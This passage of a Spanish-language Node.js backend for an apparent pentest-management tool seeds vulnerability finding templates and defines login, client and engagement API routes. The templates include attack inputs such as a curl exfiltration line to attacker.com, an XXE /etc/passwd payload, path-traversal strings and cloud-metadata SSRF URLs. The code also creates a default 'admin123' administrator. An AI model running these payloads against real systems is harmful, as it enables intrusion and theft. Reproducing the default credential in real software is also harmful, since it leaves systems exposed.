        rec:"Implementar encoding contextual de output: htmlEncode() para HTML, encodeURIComponent() para URLs, encodeForJS() para JavaScript. Usar Content Security Policy (CSP) estricto. Implementar HttpOnly y Secure flags en cookies. Validar y rechazar entradas con caracteres especiales innecesarios."},
      { title:"Server-Side Request Forgery (SSRF)", category:"SSRF", severity:"high", cwe_id:"CWE-918", cwe_name:"Server-Side Request Forgery", owasp:"A10:2021 – SSRF", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N", score:8.6,
        desc:"La aplicación acepta URLs controladas por el usuario para realizar solicitudes HTTP del lado del servidor. Un atacante puede abusar de esta funcionalidad para acceder a servicios internos no expuestos, leer metadata de instancias cloud (AWS IMDSv1, Azure IMDS) o escanear la red interna.",
        steps:"1. Identificar funcionalidades que realizan fetch/HTTP de URLs: webhooks, importación de recursos, preview de URLs.\n2. Probar con URL interna: http://127.0.0.1/admin, http://10.0.0.1:8080\n3. Probar metadata cloud: http://169.254.169.254/latest/meta-data/ (AWS)\n4. Usar Burp Collaborator o interactsh para detectar SSRF ciego.",
        rec:"Implementar allowlist estricta de dominios/IPs permitidos. Resolver y validar la IP de destino antes de realizar la solicitud (bloquear RFC1918, 127.0.0.0/8, 169.254.0.0/16). Usar IMDSv2 en AWS. Deshabilitar redireccionamientos automáticos. Ejecutar el componente de fetch en una red aislada."},
      { title:"Insecure Direct Object Reference (IDOR)", category:"Broken Access Control", severity:"high", cwe_id:"CWE-639", cwe_name:"Authorization Bypass Through User-Controlled Key", owasp:"A01:2021 – Broken Access Control", cvss:"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N", score:6.5,
        desc:"La aplicación expone referencias directas a objetos internos (IDs, UUIDs, nombres de archivo) sin verificar que el usuario autenticado tiene autorización para acceder al recurso específico solicitado.",
        steps:"1. Autenticarse con usuario A, identificar ID de objeto en la respuesta (ej: /api/facturas/1234).\n2. Cambiar el ID al de otro usuario (ej: /api/facturas/1235) sin cambiar el token de autenticación.\n3. Si la respuesta devuelve datos del otro usuario, la vulnerabilidad está confirmada.\n4. Enumerar IDs para mapear objetos accesibles.",
        rec:"Implementar autorización a nivel de objeto en cada endpoint: verificar que req.user.id === recurso.owner_id. Usar UUIDs aleatorios en vez de IDs secuenciales. Implementar middleware de autorización centralizado. Auditar todos los endpoints de API con herramientas automatizadas de autorización."},
      { title:"Authentication Bypass", category:"Authentication", severity:"critical", cwe_id:"CWE-287", cwe_name:"Improper Authentication", owasp:"A07:2021 – Identification and Authentication Failures", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", score:9.8,
        desc:"El mecanismo de autenticación de la aplicación puede ser eludido sin credenciales válidas, permitiendo a un atacante acceder a funcionalidades protegidas o suplantación de identidad.",
        steps:"1. Analizar el flujo de autenticación (tokens, cookies, parámetros de sesión).\n2. Intentar manipulación de tokens JWT: cambiar algoritmo a 'none', modificar claims sin firma válida.\n3. Probar bypass de lógica: omitir pasos del flujo MFA, manipular estado de sesión.\n4. Verificar acceso a endpoints protegidos sin token.",
        rec:"Usar librerías de autenticación probadas. Validar firma de JWT con algoritmo fijo (nunca 'none'). Implementar MFA robusto. Invalidar sesiones en el servidor al logout. Usar tokens de sesión con entropía suficiente (≥128 bits). Implementar rate limiting en endpoints de autenticación."},
      { title:"Command Injection", category:"Injection", severity:"critical", cwe_id:"CWE-78", cwe_name:"Improper Neutralization of Special Elements used in an OS Command", owasp:"A03:2021 – Injection", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", score:9.8,
        desc:"La aplicación pasa datos controlados por el usuario a funciones de ejecución de comandos del sistema operativo sin sanitización adecuada, permitiendo la ejecución de comandos arbitrarios con los privilegios del proceso de la aplicación.",
        steps:"1. Identificar funcionalidades que interactúan con el SO: ping, whois, conversión de archivos, generación de imágenes.\n2. Inyectar separadores de comandos: ; id, && id, | id, `id`\n3. Probar caracteres especiales de shell: $(), <>|;\n4. Exfiltrar datos con: ; curl http://attacker.com/$(whoami)",
        rec:"Nunca pasar datos de usuario a exec(), system(), popen() o equivalentes. Si se requiere llamar al SO, usar APIs de librería nativas (ej: libpng en vez de llamar a convert). Usar allowlists estrictas de caracteres permitidos. Ejecutar la aplicación con el menor privilegio posible."},
      { title:"XML External Entity (XXE) Injection", category:"Injection", severity:"high", cwe_id:"CWE-611", cwe_name:"Improper Restriction of XML External Entity Reference", owasp:"A05:2021 – Security Misconfiguration", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L", score:8.2,
        desc:"El parser XML de la aplicación está configurado para procesar entidades externas, permitiendo a un atacante leer archivos del sistema, realizar peticiones SSRF o causar denegación de servicio mediante ataques de expansión de entidades (Billion Laughs).",
        steps:"1. Identificar endpoints que aceptan XML: uploads, SOAP, configuraciones, exportaciones.\n2. Inyectar payload XXE básico para leer /etc/passwd:\n<!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>\n3. Probar XXE a través de SSRF: SYSTEM 'http://169.254.169.254/'\n4. Intentar XXE ciego con out-of-band: SYSTEM 'http://collaborator/'",
        rec:"Deshabilitar completamente el procesamiento de DTD/entidades externas en el parser XML. Usar parsers seguros por defecto (defusedxml en Python, FEATURE_SECURE_PROCESSING en Java). Actualizar librerías XML a versiones parcheadas. Considerar usar JSON en vez de XML donde sea posible."},
      { title:"Sensitive Data Exposure", category:"Cryptography", severity:"high", cwe_id:"CWE-200", cwe_name:"Exposure of Sensitive Information to an Unauthorized Actor", owasp:"A02:2021 – Cryptographic Failures", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", score:7.5,
        desc:"La aplicación transmite o almacena datos sensibles (contraseñas, tokens, PII, datos de tarjetas) sin cifrado adecuado o con algoritmos débiles, exponiendo la información a actores no autorizados.",
        steps:"1. Analizar tráfico HTTP/S con Burp Suite para detectar datos sensibles en texto plano.\n2. Verificar headers de seguridad: HSTS, Secure flag en cookies.\n3. Revisar fuente de la página y comentarios HTML.\n4. Analizar respuestas de API para datos sensibles innecesarios en JSON.",
        rec:"Implementar TLS 1.2+ en todos los endpoints. Habilitar HSTS. Cifrar datos sensibles en reposo (AES-256). Usar hashing robusto para contraseñas (bcrypt, Argon2id). Implementar principio de mínima exposición de datos en APIs. No incluir datos sensibles en logs."},
      { title:"Security Misconfiguration", category:"Configuration", severity:"medium", cwe_id:"CWE-16", cwe_name:"Configuration", owasp:"A05:2021 – Security Misconfiguration", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N", score:6.5,
        desc:"La aplicación o su infraestructura presenta configuraciones inseguras por defecto: servicios innecesarios habilitados, headers de seguridad ausentes, stack traces expuestos, credenciales por defecto, o permisos incorrectos.",
        steps:"1. Escanear con Nikto, nuclei o OWASP ZAP para configuraciones comunes.\n2. Verificar headers de seguridad: X-Frame-Options, X-Content-Type-Options, CSP, HSTS.\n3. Buscar rutas de administración expuestas: /admin, /phpinfo.php, /.git/\n4. Verificar mensajes de error detallados y stack traces.",
        rec:"Hardening del servidor web: deshabilitar directory listing, eliminar páginas de error por defecto. Implementar todos los security headers. Remover componentes y funcionalidades no utilizadas. Revisar permisos de archivos y directorios. Implementar proceso de hardening documentado para deployments."},
      { title:"Broken Access Control", category:"Authorization", severity:"critical", cwe_id:"CWE-284", cwe_name:"Improper Access Control", owasp:"A01:2021 – Broken Access Control", cvss:"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", score:8.8,
        desc:"La aplicación no implementa correctamente los controles de acceso, permitiendo a usuarios acceder a funcionalidades o datos fuera de sus permisos asignados, incluyendo funciones administrativas.",
        steps:"1. Mapear todos los roles y permisos de la aplicación.\n2. Con usuario de bajo privilegio, intentar acceder a endpoints/funciones de admin.\n3. Manipular tokens JWT para escalar privilegios (cambiar role en payload).\n4. Forzar navegación directa a URLs protegidas omitiendo la UI.",
        rec:"Implementar modelo de control de acceso centralizado basado en roles (RBAC). Validar permisos en el servidor en cada request, nunca confiar en validaciones del cliente. Denegar acceso por defecto, otorgar permisos explícitamente. Registrar y alertar intentos de acceso no autorizado. Implementar pruebas automatizadas de autorización."},
      { title:"Path Traversal", category:"File Access", severity:"high", cwe_id:"CWE-22", cwe_name:"Improper Limitation of a Pathname to a Restricted Directory", owasp:"A01:2021 – Broken Access Control", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", score:7.5,
        desc:"La aplicación usa datos controlados por el usuario para construir rutas de archivos sin validación adecuada, permitiendo a un atacante acceder a archivos fuera del directorio permitido usando secuencias de traversal (../).",
        steps:"1. Identificar parámetros que referencian archivos: ?file=, ?path=, ?template=\n2. Inyectar payloads de traversal: ../../../etc/passwd, ..\\..\\..\\windows\\win.ini\n3. Probar encodings: %2e%2e%2f, %252e%252e%252f (doble encoding)\n4. En uploads, enviar filename: ../../important_file.php",
        rec:"Usar funciones de resolución de paths seguros y verificar que el path resuelto comienza con el directorio base esperado. Usar allowlist de nombres de archivo/extensiones. Almacenar archivos con nombres generados internamente, no nombres del usuario. Implementar chroot o containers para limitar el filesystem accesible."},
      { title:"Weak Password Policy", category:"Authentication", severity:"medium", cwe_id:"CWE-521", cwe_name:"Weak Password Requirements", owasp:"A07:2021 – Identification and Authentication Failures", cvss:"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H", score:8.1,
        desc:"La aplicación no impone una política de contraseñas suficientemente robusta, permitiendo contraseñas cortas, simples o previamente comprometidas, facilitando ataques de fuerza bruta o credential stuffing.",
        steps:"1. Crear cuenta con contraseñas débiles: '123456', 'password', 'admin123'\n2. Verificar si acepta contraseñas de menos de 8 caracteres.\n3. Probar si bloquea contraseñas de listas de breaches (Have I Been Pwned).\n4. Verificar ausencia de MFA o su carácter opcional.",
        rec:"Requerir mínimo 12 caracteres, combinación de mayúsculas, minúsculas, números y caracteres especiales. Implementar verificación contra listas de contraseñas comprometidas (HIBP API). Implementar MFA obligatorio para roles privilegiados. Limitar intentos de login (5 intentos → bloqueo 15 min). Alertar al usuario sobre logins desde IPs/dispositivos nuevos."},
      { title:"Cross-Site Request Forgery (CSRF)", category:"CSRF", severity:"medium", cwe_id:"CWE-352", cwe_name:"Cross-Site Request Forgery", owasp:"A01:2021 – Broken Access Control", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N", score:6.5,
        desc:"La aplicación no implementa protección CSRF en endpoints con acciones de estado (POST/PUT/DELETE), permitiendo a un atacante inducir a un usuario autenticado a realizar acciones no intencionadas a través de un sitio malicioso.",
        steps:"1. Identificar formularios/peticiones sin token CSRF.\n2. Crear página HTML maliciosa con auto-submit form apuntando al endpoint vulnerable.\n3. Verificar si la acción se ejecuta cuando un usuario autenticado visita la página maliciosa.\n4. Confirmar ausencia del header Origin/Referer validation.",
        rec:"Implementar tokens CSRF sincronizados (doble submit cookie o server-side token). Verificar header Origin/Referer. Usar SameSite=Strict o SameSite=Lax en cookies de sesión. Requerir autenticación adicional (re-ingreso de contraseña) para acciones críticas. Usar APIs JSON (no aceptan cross-origin POSTs de formularios HTML)."},
      { title:"Subdomain Takeover", category:"Infrastructure", severity:"high", cwe_id:"CWE-350", cwe_name:"Reliance on Reverse DNS Resolution for a Security-Critical Action", owasp:"A05:2021 – Security Misconfiguration", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N", score:8.1,
        desc:"Un subdominio de la organización apunta (CNAME) a un servicio externo (GitHub Pages, S3, Heroku, etc.) que ya no está siendo utilizado. Un atacante puede reclamar ese servicio externo y controlar el contenido servido bajo el subdominio legítimo.",
        steps:"1. Enumerar subdominios con amass, subfinder, assetfinder.\n2. Verificar registros CNAME que apuntan a servicios cloud.\n3. Comprobar si el servicio externo está activo o puede ser reclamado.\n4. Intentar reclamar el servicio externo (ej: crear repositorio GitHub Pages con el mismo nombre).",
        rec:"Auditar periódicamente todos los registros DNS de la organización. Eliminar registros DNS apuntando a recursos externos al deshabilitar servicios. Implementar proceso de offboarding que incluya limpieza de DNS. Monitorear continuamente subdominios con herramientas automatizadas (nuclei templates de takeover)."},
      { title:"Deserialization Insegura", category:"Deserialization", severity:"critical", cwe_id:"CWE-502", cwe_name:"Deserialization of Untrusted Data", owasp:"A08:2021 – Software and Data Integrity Failures", cvss:"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H", score:8.1,
        desc:"La aplicación deserializa datos controlados por el usuario sin validación, permitiendo a un atacante modificar el estado del objeto deserializado o ejecutar código arbitrario (RCE) mediante gadget chains de la librería de clases del runtime.",
        steps:"1. Identificar datos serializados: cookies Base64 que comienzan con 'rO0AB' (Java), 'a:' (PHP), '\\x80\\x04' (Python pickle).\n2. Modificar el objeto serializado para cambiar campos como isAdmin, userId.\n3. Usar ysoserial (Java) para generar gadget chains de RCE.\n4. Explotar mediante pickle.loads() en Python con payload de ejecución de comandos.",
        rec:"Nunca deserializar datos controlados por el usuario. Usar formatos de datos simples (JSON, XML con schema) en vez de serialización nativa. Si se requiere serialización, firmar criptográficamente los datos antes de deserializar. Implementar ObjectInputStream personalizado que solo acepte clases en allowlist (Java). Ejecutar en sandbox con mínimos privilegios."},
    ];
    for(const t of tpls) {
      await qRun(
        `INSERT INTO finding_templates (id,title,category,severity,description,steps_to_reproduce,recommendation,cwe_id,cwe_name,owasp_category,cvss_vector_31,cvss_score_31,is_builtin)
         VALUES (?,?,?,?,?,?,?,?,?,?,?,?,1)`,
        [uuidv4(), t.title, t.category, t.severity, t.desc, t.steps, t.rec, t.cwe_id, t.cwe_name, t.owasp, t.cvss, t.score]
      );
    }
    console.log("[GUNGNIR] Finding templates sembrados.");
  }

  // Seed settings por defecto
  const settingsDefaults = [
    ['report_org_name',    ''],
    ['report_org_email',   ''],
    ['report_org_website', ''],
    ['report_disclaimer',  'Este informe contiene información sensible. Su distribución está restringida al equipo autorizado del cliente.'],
  ];
  for (const [k, v] of settingsDefaults) {
    await qRun("INSERT IGNORE INTO settings (`key`, `value`) VALUES (?,?)", [k, v]);
  }

  // Admin por defecto
  const existing = await qRow("SELECT id FROM users WHERE username='admin'");
  if (!existing) {
    const hash = await bcrypt.hash("admin123", 12);
    await qRun(
      "INSERT INTO users (id,username,email,full_name,password_hash,role) VALUES (?,?,?,?,?,?)",
      [uuidv4(), "admin", "", "Administrador", hash, "admin"]
    );
    console.log("[GUNGNIR] Usuario admin creado — cambiar contraseña inmediatamente.");
  }

  // Audit log trim: keep max 5000 rows to prevent unbounded table growth
  setInterval(async () => {
    try {
      const count = await qRow("SELECT COUNT(*) AS c FROM audit_logs");
      if (count && count.c > 5000) {
        await qRun(
          "DELETE FROM audit_logs WHERE id NOT IN (SELECT id FROM (SELECT id FROM audit_logs ORDER BY created_at DESC LIMIT 5000) t)"
        );
      }
    } catch(e) { /* trim failure is non-fatal */ }
  }, 60 * 60 * 1000); // run hourly

  console.log("[GUNGNIR] DB inicializada correctamente.");
}

// ── Helpers fases ─────────────────────────────────────────────────────────────
const PHASES_ORDER = ['planning','recon','scanning','exploitation','post_exploitation','reporting'];

async function ensurePhases(engagementId) {
  for (const pt of PHASES_ORDER) {
    const ex = await qRow("SELECT id FROM phases WHERE engagement_id=? AND phase_type=?", [engagementId, pt]);
    if (!ex) await qRun("INSERT INTO phases (id,engagement_id,phase_type) VALUES (?,?,?)", [uuidv4(), engagementId, pt]);
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// RUTAS
// ═══════════════════════════════════════════════════════════════════════════════

// ── Health ────────────────────────────────────────────────────────────────────
app.get("/api/health", (_, res) => res.json({ ok: true, system: "Gungnir", version: "0.1.0" }));

// ── AUTH ──────────────────────────────────────────────────────────────────────
app.post("/api/auth/login", async (req, res) => {
  const { username, password, totp_token } = req.body;
  if (!username || !password) return res.status(400).json({ error: "Faltan campos" });

  const user = await qRow("SELECT * FROM users WHERE username=? AND is_active=1", [username]);
  if (!user) return res.status(401).json({ error: "Credenciales incorrectas" });

  if (user.locked_until && new Date(user.locked_until) > new Date()) {
    return res.status(429).json({ error: "Cuenta bloqueada temporalmente. Intentá más tarde." });
  }

  const ok = await bcrypt.compare(password, user.password_hash);
  if (!ok) {
    const attempts = user.failed_attempts + 1;
    const locked = attempts >= 5 ? new Date(Date.now() + 15*60*1000).toISOString().slice(0,19).replace("T"," ") : null;
    await qRun("UPDATE users SET failed_attempts=?, locked_until=? WHERE id=?", [attempts, locked, user.id]);
    return res.status(401).json({ error: "Credenciales incorrectas" });
  }

  if (user.totp_enabled) {
    if (!totp_token) return res.status(200).json({ requires_totp: true });
    if (!verifyTotp(user.totp_secret, totp_token)) {
      // Count TOTP failure toward lockout to prevent brute-force after password is known
      const attempts = user.failed_attempts + 1;
      const locked = attempts >= 5 ? new Date(Date.now() + 15*60*1000).toISOString().slice(0,19).replace("T"," ") : null;
      await qRun("UPDATE users SET failed_attempts=?, locked_until=? WHERE id=?", [attempts, locked, user.id]);
      return res.status(401).json({ error: "Código 2FA incorrecto" });
    }
  }

  await qRun("UPDATE users SET failed_attempts=0, locked_until=NULL, last_login=NOW() WHERE id=?", [user.id]);
  const loginAction = user.totp_enabled ? "login_2fa" : "login";
  const loginDetail = user.totp_enabled ? `Login 2FA desde ${req.ip}` : `Login desde ${req.ip}`;
  auditLog(user.id, user.username, loginAction, "users", user.id, loginDetail, req.ip);

  const token = jwt.sign({ id: user.id, role: user.role, tv: user.token_version }, JWT_SECRET, { expiresIn: "12h" });
  res.json({
    token,
    user: { id: user.id, username: user.username, email: user.email, full_name: user.full_name, role: user.role, totp_enabled: !!user.totp_enabled }
  });
});

app.get("/api/auth/me", auth(), async (req, res) => {
  const user = await qRow("SELECT id,username,email,full_name,role,totp_enabled,last_login FROM users WHERE id=?", [req.user.id]);
  res.json(user);
});

app.post("/api/auth/change-password", auth(), async (req, res) => {
  const { current_password, new_password } = req.body;
  const user = await qRow("SELECT * FROM users WHERE id=?", [req.user.id]);
  if (!await bcrypt.compare(current_password, user.password_hash)) return res.status(400).json({ error: "Contraseña actual incorrecta" });
  const err = validatePassword(new_password);
  if (err) return res.status(400).json({ error: err });
  const hash = await bcrypt.hash(new_password, 12);
  await qRun("UPDATE users SET password_hash=?, token_version=token_version+1 WHERE id=?", [hash, req.user.id]);
  auditLog(req.user.id, req.user.username, "change_password", "users", req.user.id, null, req.ip);
  res.json({ ok: true });
});

// ── DASHBOARD ─────────────────────────────────────────────────────────────────
app.get("/api/dashboard", auth(), async (req, res) => {
  // Ejecutar todas las queries en paralelo para minimizar latencia
  const [
    [[ counters ]],
    severity_breakdown,
    findings_by_status,
    engagements_by_status,
    recent_logs,
    recent_engagements,
  ] = await Promise.all([
    db.execute(`SELECT
      (SELECT COUNT(*) FROM engagements) AS total_engagements,
      (SELECT COUNT(*) FROM engagements WHERE status='in_progress') AS active_engagements,
      (SELECT COUNT(*) FROM clients) AS total_clients,
      (SELECT COUNT(*) FROM findings) AS total_findings,
      (SELECT COUNT(*) FROM findings WHERE severity='critical' AND status='open') AS critical_open,
      (SELECT COUNT(*) FROM findings WHERE severity='high' AND status='open') AS high_open`),
    qRows(`SELECT severity, COUNT(*) AS count FROM findings WHERE status='open' GROUP BY severity ORDER BY FIELD(severity,'critical','high','medium','low','info')`),
    qRows(`SELECT status, COUNT(*) AS count FROM findings GROUP BY status`),
    qRows(`SELECT status, COUNT(*) AS count FROM engagements GROUP BY status`),
    qRows(`SELECT ol.logged_at, ol.tool, ol.target, ol.command, e.title AS engagement_title
           FROM operation_logs ol
           JOIN engagements e ON e.id=ol.engagement_id
           ORDER BY ol.logged_at DESC LIMIT 5`),
    qRows(`SELECT e.id, e.title, c.name AS client_name, e.status, e.type, e.current_phase, e.updated_at
           FROM engagements e JOIN clients c ON c.id=e.client_id
           ORDER BY e.updated_at DESC LIMIT 8`),
  ]);

  res.json({
    ...counters,
    recent_engagements,
    severity_breakdown,
    findings_by_status,
    engagements_by_status,
    recent_logs,
  });
});

// ── CLIENTES ──────────────────────────────────────────────────────────────────

app.get("/api/clientes", auth(), async (req, res) => {
  const rows = await qRows(
    `SELECT c.id, c.name, c.industry, c.contact_name, c.contact_email, c.created_at,
       (SELECT COUNT(*) FROM engagements e WHERE e.client_id=c.id) AS total_engagements,
       (SELECT COUNT(*) FROM engagements e WHERE e.client_id=c.id AND e.status='in_progress') AS active_engagements
     FROM clients c ORDER BY c.name`
  );
  res.json(rows);
});

app.get("/api/clientes/:id", auth(), async (req, res) => {
  const c = await qRow("SELECT * FROM clients WHERE id=?", [req.params.id]);
  if (!c) return res.status(404).json({ error: "No encontrado" });
  c.engagements = await qRows(
    "SELECT id,title,type,status,current_phase,start_date,end_date,updated_at FROM engagements WHERE client_id=? ORDER BY updated_at DESC",
    [req.params.id]
  );
  res.json(c);
});

app.post("/api/clientes", auth(["admin","auditor"]), async (req, res) => {
  const { name, industry, size, country, contact_name, contact_email, contact_phone, exec_contact_name, exec_contact_email, notes } = req.body;
  if (!name) return res.status(400).json({ error: "El nombre es requerido" });
  const id = uuidv4();
  await qRun(
    "INSERT INTO clients (id,name,industry,size,country,contact_name,contact_email,contact_phone,exec_contact_name,exec_contact_email,notes,created_by) VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
    [id, name, industry||null, size||null, country||null, contact_name||null, contact_email||null, contact_phone||null, exec_contact_name||null, exec_contact_email||null, notes||null, req.user.id]
  );
  const created = await qRow("SELECT * FROM clients WHERE id=?", [id]);
  res.status(201).json(created);
});

app.put("/api/clientes/:id", auth(["admin","auditor"]), async (req, res) => {
  const { name, industry, size, country, contact_name, contact_email, contact_phone, exec_contact_name, exec_contact_email, notes, nda_signed } = req.body;
  const c = await qRow("SELECT id FROM clients WHERE id=?", [req.params.id]);
  if (!c) return res.status(404).json({ error: "No encontrado" });
  await qRun(
    "UPDATE clients SET name=?,industry=?,size=?,country=?,contact_name=?,contact_email=?,contact_phone=?,exec_contact_name=?,exec_contact_email=?,notes=?,nda_signed=? WHERE id=?",
    [name, industry||null, size||null, country||null, contact_name||null, contact_email||null, contact_phone||null, exec_contact_name||null, exec_contact_email||null, notes||null, nda_signed?1:0, req.params.id]
  );
  res.json(await qRow("SELECT * FROM clients WHERE id=?", [req.params.id]));
});

app.delete("/api/clientes/:id", auth(["admin"]), async (req, res) => {
  const c = await qRow("SELECT id FROM clients WHERE id=?", [req.params.id]);
  if (!c) return res.status(404).json({ error: "No encontrado" });
  // Verificar que no tenga engagements activos
  const active = await qRow(
    "SELECT id FROM engagements WHERE client_id=? AND status NOT IN ('completed','cancelled') LIMIT 1",
    [req.params.id]
  );
  if (active) return res.status(409).json({ error: "El cliente tiene engagements activos. Cerrá o cancelalos primero." });
  await qRun("DELETE FROM clients WHERE id=?", [req.params.id]);
  res.json({ ok: true });
});

// ── ENGAGEMENTS ───────────────────────────────────────────────────────────────
app.get("/api/engagements", auth(), async (req, res) => {
  const rows = await qRows(
    `SELECT e.id, e.title, e.codename, c.name AS client_name, e.type, e.methodology, e.status,
       e.current_phase, e.start_date, e.end_date, e.updated_at,
       (SELECT COUNT(*) FROM findings f WHERE f.engagement_id=e.id) AS findings_count,
       (SELECT COUNT(*) FROM findings f WHERE f.engagement_id=e.id AND f.severity='critical' AND f.status='open') AS critical_count,
       u.full_name AS lead_name
     FROM engagements e
     JOIN clients c ON c.id=e.client_id
     LEFT JOIN users u ON u.id=e.lead_id
     ORDER BY e.updated_at DESC`
  );
  res.json(rows);
});

app.get("/api/engagements/:id", auth(), async (req, res) => {
  const eng = await qRow(
    `SELECT e.*, c.name AS client_name, u.full_name AS lead_name
     FROM engagements e
     JOIN clients c ON c.id=e.client_id
     LEFT JOIN users u ON u.id=e.lead_id
     WHERE e.id=?`,
    [req.params.id]
  );
  if (!eng) return res.status(404).json({ error: "No encontrado" });

  // Fases con conteos
  const phases = await qRows(
    `SELECT p.*,
       (SELECT COUNT(*) FROM operation_logs l WHERE l.engagement_id=p.engagement_id AND l.phase_type=p.phase_type) AS logs_count,
       (SELECT COUNT(*) FROM findings f WHERE f.engagement_id=p.engagement_id AND f.phase_type=p.phase_type) AS findings_count
     FROM phases p WHERE p.engagement_id=? ORDER BY FIELD(p.phase_type,'planning','recon','scanning','exploitation','post_exploitation','reporting')`,
    [req.params.id]
  );
  eng.phases = phases;

  // Scope
  const scope = await qRows("SELECT * FROM scope_items WHERE engagement_id=? ORDER BY in_scope DESC, value", [req.params.id]);
  eng.scope_in  = scope.filter(s => s.in_scope).map(s => s.value);
  eng.scope_out = scope.filter(s => !s.in_scope).map(s => s.value);
  eng.scope_items = scope;

  res.json(eng);
});

app.post("/api/engagements", auth(["admin","auditor"]), async (req, res) => {
  const { client_id, title, codename, type, methodology, mode, start_date, end_date, lead_id, notes } = req.body;
  if (!client_id || !title) return res.status(400).json({ error: "client_id y title son requeridos" });
  const client = await qRow("SELECT id FROM clients WHERE id=?", [client_id]);
  if (!client) return res.status(404).json({ error: "Cliente no encontrado" });
  const id = uuidv4();
  const engMode = mode === 'custom' ? 'custom' : 'pentesting';
  await qRun(
    "INSERT INTO engagements (id,client_id,title,codename,type,methodology,mode,lead_id,start_date,end_date,notes,status,current_phase,created_by) VALUES (?,?,?,?,?,?,?,?,?,?,?,'planned','planning',?)",
    [id, client_id, title, codename||null, type||'web_app', methodology||'ptes', engMode, lead_id||req.user.id, start_date||null, end_date||null, notes||null, req.user.id]
  );
  if (engMode === 'pentesting') {
    await ensurePhases(id);
    await qRun("UPDATE phases SET status='in_progress', started_at=NOW() WHERE engagement_id=? AND phase_type='planning'", [id]);
  }
  res.status(201).json(await qRow("SELECT e.*,c.name AS client_name FROM engagements e JOIN clients c ON c.id=e.client_id WHERE e.id=?", [id]));
});

app.put("/api/engagements/:id", auth(["admin","auditor"]), async (req, res) => {
  const eng = await qRow("SELECT id, status FROM engagements WHERE id=?", [req.params.id]);
  if (!eng) return res.status(404).json({ error: "No encontrado" });
  const { title, codename, type, methodology, status, start_date, end_date, lead_id, rules_of_engagement, emergency_contacts, notes } = req.body;
  await qRun(
    "UPDATE engagements SET title=?,codename=?,type=?,methodology=?,status=?,start_date=?,end_date=?,lead_id=?,rules_of_engagement=?,emergency_contacts=?,notes=? WHERE id=?",
    [
      title,
      codename||null,
      type||null,
      methodology||null,
      status||eng.status,          // preserva el status actual si no se envía
      start_date||null,
      end_date||null,
      lead_id||null,
      rules_of_engagement||null,
      emergency_contacts ? JSON.stringify(emergency_contacts) : null,
      notes||null,
      req.params.id,
    ]
  );
  res.json(await qRow("SELECT e.*,c.name AS client_name FROM engagements e JOIN clients c ON c.id=e.client_id WHERE e.id=?", [req.params.id]));
});

// Renombrar engagement (solo título)
app.patch("/api/engagements/:id/title", auth(["admin","auditor"]), async (req, res) => {
  const { title } = req.body;
  if (!title?.trim()) return res.status(400).json({ error: "El título no puede estar vacío" });
  const eng = await qRow("SELECT id FROM engagements WHERE id=?", [req.params.id]);
  if (!eng) return res.status(404).json({ error: "No encontrado" });
  await qRun("UPDATE engagements SET title=? WHERE id=?", [title.trim(), req.params.id]);
  res.json({ ok: true, title: title.trim() });
});

// Cambiar fase activa
app.put("/api/engagements/:id/phase", auth(), async (req, res) => {
  const { phase } = req.body;
  if (!PHASES_ORDER.includes(phase)) return res.status(400).json({ error: "Fase inválida" });
  const eng = await qRow("SELECT id FROM engagements WHERE id=?", [req.params.id]);
  if (!eng) return res.status(404).json({ error: "No encontrado" });

  // Solo pasar a 'in_progress' si el engagement aún no fue entregado/archivado
  await qRun(
    "UPDATE engagements SET current_phase=?, status=IF(status IN ('planned'), 'in_progress', status) WHERE id=?",
    [phase, req.params.id]
  );
  // Solo marcar la fase como 'in_progress' si NO estaba ya completada
  await qRun(
    "UPDATE phases SET status=IF(status='completed', 'completed', 'in_progress'), started_at=COALESCE(started_at, NOW()) WHERE engagement_id=? AND phase_type=?",
    [req.params.id, phase]
  );
  res.json({ ok: true, current_phase: phase });
});

// PUT /api/engagements/:id/phases/:phase/status — marcar fase como completed/in_progress/not_started
app.put("/api/engagements/:id/phases/:phase/status", auth(), async (req, res) => {
  const { status } = req.body;
  if (!['not_started','in_progress','completed'].includes(status)) return res.status(400).json({ error: "Status inválido" });
  if (!PHASES_ORDER.includes(req.params.phase)) return res.status(400).json({ error: "Fase inválida" });
  await qRun(
    `UPDATE phases SET status=?,
      started_at = CASE WHEN ? IN ('in_progress','completed') THEN COALESCE(started_at, NOW()) ELSE started_at END,
      completed_at = CASE WHEN ?='completed' THEN NOW() ELSE NULL END
     WHERE engagement_id=? AND phase_type=?`,
    [status, status, status, req.params.id, req.params.phase]
  );
  // Auto-actualizar status del engagement según estado de fases
  const allPhases = await qRows("SELECT status FROM phases WHERE engagement_id=?", [req.params.id]);
  if (allPhases.length === 6 && allPhases.every(p => p.status === 'completed')) {
    await qRun(
      "UPDATE engagements SET status='delivered' WHERE id=? AND status IN ('in_progress','reporting','qa')",
      [req.params.id]
    );
  } else if (allPhases.some(p => p.status === 'in_progress' || p.status === 'completed')) {
    await qRun(
      "UPDATE engagements SET status='in_progress' WHERE id=? AND status='planned'",
      [req.params.id]
    );
  }
  res.json({ ok: true, status });
});

// ── SCOPE ─────────────────────────────────────────────────────────────────────
app.get("/api/engagements/:id/scope", auth(), async (req, res) => {
  res.json(await qRows("SELECT * FROM scope_items WHERE engagement_id=? ORDER BY in_scope DESC, value", [req.params.id]));
});

app.post("/api/engagements/:id/scope", auth(), async (req, res) => {
  const { type, value, in_scope, notes } = req.body;
